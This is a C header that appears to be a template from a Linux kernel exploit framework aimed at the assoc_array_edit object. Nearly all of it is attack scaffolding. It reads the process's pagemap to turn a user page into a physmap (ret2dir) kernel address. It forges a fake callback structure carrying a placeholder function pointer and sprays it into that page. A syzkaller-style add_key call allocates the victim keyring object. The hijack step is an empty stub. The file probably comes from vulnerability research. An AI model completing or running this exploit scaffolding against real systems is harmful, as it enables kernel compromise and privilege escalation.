#ifndef _ASSOC_ARRAY_EDIT_TMPL_H_
#define _ASSOC_ARRAY_EDIT_TMPL_H_

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>

#define KMALLOC_SIZE 512

// for ret2dir
#define PHYS_OFFSET 0xffff880000000000
#define PFN_MIN 0
#define PAGE_SIZE 0x1000
#define USER_ADDR 0x40000000
#define PAGE_SHIFT 12

struct assoc_array_edit {
	void* callback_next;
    char hole2[0x140];
};

struct callback_head {
	void* callback_next;
	void* callback_func;
};

struct assoc_array_edit fake_assoc_array_edit;
struct callback_head fake_callback_head;

unsigned overwrite_start = 0x00;
unsigned overwrite_end = 0x08;

void* victim_obj = (void*)&fake_assoc_array_edit;

uint64_t kaddr = 0;

void do_setup_physmap() {
    void* uaddr = (void*)USER_ADDR;
    void* raddr = NULL;
    void* ret = NULL;
    char file_name[30];
    sprintf(file_name, "/proc/%d/pagemap", getpid());
    int fd = open(file_name, O_RDONLY);
    if (fd < 0) {
        perror("open failed");
		goto err;
    }
    uint64_t v = 0;
    uint64_t pfn = 0;

    munmap(uaddr, PAGE_SIZE);
    raddr = mmap(uaddr, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    if(raddr == MAP_FAILED) {
        perror("mmap failed");
        goto err;
    }
    // necessary due to lazy allocation
    memset(raddr, 0, PAGE_SIZE);
    lseek(fd, ((uint64_t)uaddr >> PAGE_SHIFT)*sizeof(uint64_t), SEEK_SET);
    read(fd, &v, sizeof(uint64_t));
    if (v & (1UL << 63)) {
        pfn = v & ((1UL << 55) - 1);
        fprintf(stdout, "pfn: 0x%lx\n", pfn);
        kaddr = PHYS_OFFSET + 0x1000 * (pfn-PFN_MIN);
        fprintf(stdout, "kaddr: 0x%lx\n", kaddr);
        ret = (void*)kaddr;

		memset(&fake_assoc_array_edit, 0x00, sizeof(struct assoc_array_edit));
		fake_assoc_array_edit.callback_next= (void*)kaddr;
		fake_callback_head.callback_next = 0;
		fake_callback_head.callback_func = (void*)0xffffffffdeadbeef;
		memset((void*)USER_ADDR, 0xff, PAGE_SIZE);
		memcpy((void*)USER_ADDR, &fake_callback_head, sizeof(struct callback_head));
    }
	return;
err:
	close(fd);
	exit(-1);
}

void do_alloc_victim() {
  syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
  long res = 0;
  memcpy((void*)0x200000c0, "keyring", 8);
  memcpy((void*)0x20000180, "syz", 3);
  *(uint8_t*)0x20000183 = 0x22;
  *(uint8_t*)0x20000184 = 0;
  res = syscall(__NR_add_key, 0x200000c0, 0x20000180, 0, 0, 0xfffffffc);
}

void do_hijack() {
}

#endif
